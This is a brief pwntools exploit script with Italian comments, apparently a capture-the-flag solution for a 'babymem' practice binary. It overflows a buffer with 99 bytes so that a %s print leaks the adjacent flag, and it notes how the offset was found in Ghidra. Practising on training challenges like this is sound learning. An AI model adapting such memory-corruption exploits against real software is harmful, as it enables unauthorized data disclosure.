from pwn import * 

elf = ELF("/challenge/babymem-level-10-0")
io = elf.process()

# Payload size
# Deve essere la dimensione della distanza tra buffer e flag
# Quindi 99?

# Per trovare il valore, su ghidra, distanza tra la notazione delle due var

io.sendline(b"99")
io.sendline(b'A'*99)

# Sfrutta la "vulnerabilità" nel %s

io.interactive()
